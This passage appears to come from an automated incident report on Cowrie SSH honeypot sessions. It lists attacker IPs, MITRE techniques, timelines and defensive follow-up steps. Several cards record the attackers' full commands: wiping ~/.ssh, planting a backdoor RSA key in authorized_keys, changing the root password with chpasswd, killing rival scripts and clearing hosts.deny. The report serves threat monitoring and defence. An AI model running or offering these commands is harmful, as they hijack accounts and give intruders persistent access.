| `2026-04-07 11:58:37` | `cowrie.client.kex` |
| `2026-04-07 11:58:38` | `cowrie.login.success` |
| `2026-04-07 11:58:38` | `cowrie.session.params` |
| `2026-04-07 11:58:38` | `cowrie.command.input` |
| `2026-04-07 11:58:38` | `cowrie.command.failed` |
| `2026-04-07 11:58:38` | `cowrie.log.closed` |
| `2026-04-07 11:58:38` | `cowrie.session.params` |
| `2026-04-07 11:58:38` | `cowrie.command.input` |
| `2026-04-07 11:58:39` | `cowrie.session.file_download` |
| `2026-04-07 11:58:39` | `cowrie.log.closed` |
| `2026-04-07 11:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f0eff0a2f9f

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:58 |
| **Last Seen** | 2026-04-07 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:58:41` | `cowrie.session.connect` |
| `2026-04-07 11:58:41` | `cowrie.client.version` |
| `2026-04-07 11:58:41` | `cowrie.client.kex` |
| `2026-04-07 11:58:41` | `cowrie.login.success` |
| `2026-04-07 11:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3155c1db36aa

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 11:59 |
| **Last Seen** | 2026-04-07 12:01 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WvxNFHndVG1g"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:59:48` | `cowrie.session.connect` |
| `2026-04-07 11:59:51` | `cowrie.client.version` |
| `2026-04-07 11:59:52` | `cowrie.client.kex` |
| `2026-04-07 11:59:54` | `cowrie.login.success` |
| `2026-04-07 11:59:55` | `cowrie.session.params` |
| `2026-04-07 11:59:55` | `cowrie.command.input` |
| `2026-04-07 11:59:55` | `cowrie.command.failed` |
| `2026-04-07 11:59:59` | `cowrie.log.closed` |
| `2026-04-07 12:00:03` | `cowrie.session.params` |
| `2026-04-07 12:00:03` | `cowrie.command.input` |
| `2026-04-07 12:00:04` | `cowrie.session.file_download` |
| `2026-04-07 12:00:04` | `cowrie.log.closed` |
| `2026-04-07 12:00:31` | `cowrie.session.params` |
| `2026-04-07 12:00:31` | `cowrie.command.input` |
| `2026-04-07 12:00:31` | `cowrie.log.closed` |
| `2026-04-07 12:00:32` | `cowrie.session.params` |
| `2026-04-07 12:00:32` | `cowrie.command.input` |
| `2026-04-07 12:00:33` | `cowrie.log.closed` |
| `2026-04-07 12:00:37` | `cowrie.session.params` |
| `2026-04-07 12:00:37` | `cowrie.command.input` |
| `2026-04-07 12:00:43` | `cowrie.session.file_download` |
| `2026-04-07 12:00:43` | `cowrie.log.closed` |
| `2026-04-07 12:00:44` | `cowrie.session.params` |
| `2026-04-07 12:00:44` | `cowrie.command.input` |
| `2026-04-07 12:00:44` | `cowrie.log.closed` |
| `2026-04-07 12:00:45` | `cowrie.session.params` |
| `2026-04-07 12:00:45` | `cowrie.command.input` |
| `2026-04-07 12:00:45` | `cowrie.log.closed` |
| `2026-04-07 12:00:46` | `cowrie.session.params` |
| `2026-04-07 12:00:46` | `cowrie.command.input` |
| `2026-04-07 12:00:46` | `cowrie.command.input` |
| `2026-04-07 12:00:47` | `cowrie.log.closed` |
| `2026-04-07 12:00:48` | `cowrie.session.params` |
| `2026-04-07 12:00:48` | `cowrie.command.input` |
| `2026-04-07 12:00:49` | `cowrie.log.closed` |
| `2026-04-07 12:00:51` | `cowrie.session.params` |
| `2026-04-07 12:00:51` | `cowrie.command.input` |
| `2026-04-07 12:00:56` | `cowrie.log.closed` |
| `2026-04-07 12:00:56` | `cowrie.session.params` |
| `2026-04-07 12:00:56` | `cowrie.command.input` |
| `2026-04-07 12:00:57` | `cowrie.log.closed` |
| `2026-04-07 12:00:58` | `cowrie.session.params` |
| `2026-04-07 12:00:58` | `cowrie.command.input` |
| `2026-04-07 12:01:00` | `cowrie.log.closed` |
| `2026-04-07 12:01:01` | `cowrie.session.params` |
| `2026-04-07 12:01:01` | `cowrie.command.input` |
| `2026-04-07 12:01:01` | `cowrie.log.closed` |
| `2026-04-07 12:01:02` | `cowrie.session.params` |
| `2026-04-07 12:01:02` | `cowrie.command.input` |
| `2026-04-07 12:01:04` | `cowrie.log.closed` |
| `2026-04-07 12:01:07` | `cowrie.session.params` |
| `2026-04-07 12:01:07` | `cowrie.command.input` |
| `2026-04-07 12:01:08` | `cowrie.log.closed` |
| `2026-04-07 12:01:09` | `cowrie.session.params` |
| `2026-04-07 12:01:09` | `cowrie.command.input` |
| `2026-04-07 12:01:12` | `cowrie.log.closed` |
| `2026-04-07 12:01:14` | `cowrie.session.params` |
| `2026-04-07 12:01:14` | `cowrie.command.input` |
| `2026-04-07 12:01:14` | `cowrie.log.closed` |
| `2026-04-07 12:01:16` | `cowrie.session.params` |
| `2026-04-07 12:01:16` | `cowrie.command.input` |
| `2026-04-07 12:01:17` | `cowrie.log.closed` |
| `2026-04-07 12:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5025141ec2b

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 12:02 |
| **Last Seen** | 2026-04-07 12:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:02:53` | `cowrie.session.connect` |
| `2026-04-07 12:02:53` | `cowrie.client.version` |
| `2026-04-07 12:02:53` | `cowrie.client.kex` |
| `2026-04-07 12:02:53` | `cowrie.login.success` |
| `2026-04-07 12:02:54` | `cowrie.session.params` |
| `2026-04-07 12:02:54` | `cowrie.command.input` |
| `2026-04-07 12:02:54` | `cowrie.command.failed` |
| `2026-04-07 12:02:54` | `cowrie.log.closed` |
| `2026-04-07 12:02:54` | `cowrie.session.params` |
| `2026-04-07 12:02:54` | `cowrie.command.input` |
| `2026-04-07 12:02:54` | `cowrie.session.file_download` |
| `2026-04-07 12:02:54` | `cowrie.log.closed` |
| `2026-04-07 12:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e8c741fed1f

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 12:02 |
| **Last Seen** | 2026-04-07 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:02:56` | `cowrie.session.connect` |
| `2026-04-07 12:02:56` | `cowrie.client.version` |
| `2026-04-07 12:02:56` | `cowrie.client.kex` |
| `2026-04-07 12:02:57` | `cowrie.login.success` |
| `2026-04-07 12:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbf4df1fb1ba

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:09 |
| **Last Seen** | 2026-04-07 12:10 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:09:46` | `cowrie.session.connect` |
| `2026-04-07 12:09:46` | `cowrie.client.version` |
| `2026-04-07 12:09:51` | `cowrie.client.kex` |
| `2026-04-07 12:09:57` | `cowrie.login.success` |
| `2026-04-07 12:09:58` | `cowrie.session.params` |
| `2026-04-07 12:09:58` | `cowrie.command.input` |
| `2026-04-07 12:09:58` | `cowrie.command.failed` |
| `2026-04-07 12:09:58` | `cowrie.log.closed` |
| `2026-04-07 12:09:59` | `cowrie.session.params` |
| `2026-04-07 12:09:59` | `cowrie.command.input` |
| `2026-04-07 12:09:59` | `cowrie.session.file_download` |
| `2026-04-07 12:09:59` | `cowrie.log.closed` |
| `2026-04-07 12:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01b8b172173

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:10 |
| **Last Seen** | 2026-04-07 12:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:10:10` | `cowrie.session.connect` |
| `2026-04-07 12:10:11` | `cowrie.client.version` |
| `2026-04-07 12:10:11` | `cowrie.client.kex` |
| `2026-04-07 12:10:17` | `cowrie.login.success` |
| `2026-04-07 12:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20a342131725

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:19 |
| **Last Seen** | 2026-04-07 12:20 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:19:36` | `cowrie.session.connect` |
| `2026-04-07 12:19:36` | `cowrie.client.version` |
| `2026-04-07 12:19:37` | `cowrie.client.kex` |
| `2026-04-07 12:19:40` | `cowrie.login.success` |
| `2026-04-07 12:19:46` | `cowrie.session.params` |
| `2026-04-07 12:19:46` | `cowrie.command.input` |
| `2026-04-07 12:19:46` | `cowrie.command.failed` |
| `2026-04-07 12:19:51` | `cowrie.log.closed` |
| `2026-04-07 12:19:52` | `cowrie.session.params` |
| `2026-04-07 12:19:52` | `cowrie.command.input` |
| `2026-04-07 12:19:52` | `cowrie.session.file_download` |
| `2026-04-07 12:19:52` | `cowrie.log.closed` |
| `2026-04-07 12:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988ed3f6236b

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:20 |
| **Last Seen** | 2026-04-07 12:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:20:01` | `cowrie.session.connect` |
| `2026-04-07 12:20:01` | `cowrie.client.version` |
| `2026-04-07 12:20:01` | `cowrie.client.kex` |
| `2026-04-07 12:20:12` | `cowrie.login.success` |
| `2026-04-07 12:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68cd31d013d2

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:24 |
| **Last Seen** | 2026-04-07 12:25 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:24:28` | `cowrie.session.connect` |
| `2026-04-07 12:24:30` | `cowrie.client.version` |
| `2026-04-07 12:24:33` | `cowrie.client.kex` |
| `2026-04-07 12:24:36` | `cowrie.login.success` |
| `2026-04-07 12:24:38` | `cowrie.session.params` |
| `2026-04-07 12:24:38` | `cowrie.command.input` |
| `2026-04-07 12:24:38` | `cowrie.command.failed` |
| `2026-04-07 12:24:38` | `cowrie.log.closed` |
| `2026-04-07 12:24:39` | `cowrie.session.params` |
| `2026-04-07 12:24:39` | `cowrie.command.input` |
| `2026-04-07 12:24:39` | `cowrie.session.file_download` |
| `2026-04-07 12:24:39` | `cowrie.log.closed` |
| `2026-04-07 12:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc84f9e4667e

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:24 |
| **Last Seen** | 2026-04-07 12:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:24:52` | `cowrie.session.connect` |
| `2026-04-07 12:24:52` | `cowrie.client.version` |
| `2026-04-07 12:24:53` | `cowrie.client.kex` |
| `2026-04-07 12:25:00` | `cowrie.login.success` |
| `2026-04-07 12:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1c578641ed

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:45 |
| **Last Seen** | 2026-04-07 12:46 |
| **Session Duration** | 89s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:f4Buhvu6N1eA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:45:01` | `cowrie.session.connect` |
| `2026-04-07 12:45:01` | `cowrie.client.version` |
| `2026-04-07 12:45:01` | `cowrie.client.kex` |
| `2026-04-07 12:45:07` | `cowrie.login.success` |
| `2026-04-07 12:45:11` | `cowrie.session.params` |
| `2026-04-07 12:45:11` | `cowrie.command.input` |
| `2026-04-07 12:45:11` | `cowrie.command.failed` |
| `2026-04-07 12:45:12` | `cowrie.log.closed` |
| `2026-04-07 12:45:13` | `cowrie.session.params` |
| `2026-04-07 12:45:13` | `cowrie.command.input` |
| `2026-04-07 12:45:13` | `cowrie.session.file_download` |
| `2026-04-07 12:45:13` | `cowrie.log.closed` |
| `2026-04-07 12:45:35` | `cowrie.session.params` |
| `2026-04-07 12:45:35` | `cowrie.command.input` |
| `2026-04-07 12:45:35` | `cowrie.log.closed` |
| `2026-04-07 12:45:37` | `cowrie.session.params` |
| `2026-04-07 12:45:37` | `cowrie.command.input` |
| `2026-04-07 12:45:37` | `cowrie.log.closed` |
| `2026-04-07 12:45:38` | `cowrie.session.params` |
| `2026-04-07 12:45:38` | `cowrie.command.input` |
| `2026-04-07 12:45:41` | `cowrie.session.file_download` |
| `2026-04-07 12:45:41` | `cowrie.log.closed` |
| `2026-04-07 12:45:41` | `cowrie.session.params` |
| `2026-04-07 12:45:41` | `cowrie.command.input` |
| `2026-04-07 12:45:45` | `cowrie.log.closed` |
| `2026-04-07 12:45:46` | `cowrie.session.params` |
| `2026-04-07 12:45:46` | `cowrie.command.input` |
| `2026-04-07 12:45:47` | `cowrie.log.closed` |
| `2026-04-07 12:45:48` | `cowrie.session.params` |
| `2026-04-07 12:45:48` | `cowrie.command.input` |
| `2026-04-07 12:45:48` | `cowrie.command.input` |
| `2026-04-07 12:45:48` | `cowrie.log.closed` |
| `2026-04-07 12:45:49` | `cowrie.session.params` |
| `2026-04-07 12:45:49` | `cowrie.command.input` |
| `2026-04-07 12:45:50` | `cowrie.log.closed` |
| `2026-04-07 12:45:51` | `cowrie.session.params` |
| `2026-04-07 12:45:51` | `cowrie.command.input` |
| `2026-04-07 12:45:52` | `cowrie.log.closed` |
| `2026-04-07 12:45:58` | `cowrie.session.params` |
| `2026-04-07 12:45:58` | `cowrie.command.input` |
| `2026-04-07 12:45:59` | `cowrie.log.closed` |
| `2026-04-07 12:46:00` | `cowrie.session.params` |
| `2026-04-07 12:46:00` | `cowrie.command.input` |
| `2026-04-07 12:46:00` | `cowrie.log.closed` |
| `2026-04-07 12:46:02` | `cowrie.session.params` |
| `2026-04-07 12:46:02` | `cowrie.command.input` |
| `2026-04-07 12:46:02` | `cowrie.log.closed` |
| `2026-04-07 12:46:09` | `cowrie.session.params` |
| `2026-04-07 12:46:09` | `cowrie.command.input` |
| `2026-04-07 12:46:13` | `cowrie.log.closed` |
| `2026-04-07 12:46:14` | `cowrie.session.params` |
| `2026-04-07 12:46:14` | `cowrie.command.input` |
| `2026-04-07 12:46:16` | `cowrie.log.closed` |
| `2026-04-07 12:46:17` | `cowrie.session.params` |
| `2026-04-07 12:46:17` | `cowrie.command.input` |
| `2026-04-07 12:46:18` | `cowrie.log.closed` |
| `2026-04-07 12:46:23` | `cowrie.session.params` |
| `2026-04-07 12:46:23` | `cowrie.command.input` |
| `2026-04-07 12:46:28` | `cowrie.log.closed` |
| `2026-04-07 12:46:29` | `cowrie.session.params` |
| `2026-04-07 12:46:29` | `cowrie.command.input` |
| `2026-04-07 12:46:30` | `cowrie.log.closed` |
| `2026-04-07 12:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-accb23749ea4

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:55 |
| **Last Seen** | 2026-04-07 12:55 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:55:02` | `cowrie.session.connect` |
| `2026-04-07 12:55:04` | `cowrie.client.version` |
| `2026-04-07 12:55:04` | `cowrie.client.kex` |
| `2026-04-07 12:55:07` | `cowrie.login.success` |
| `2026-04-07 12:55:09` | `cowrie.session.params` |
| `2026-04-07 12:55:09` | `cowrie.command.input` |
| `2026-04-07 12:55:09` | `cowrie.command.failed` |
| `2026-04-07 12:55:09` | `cowrie.log.closed` |
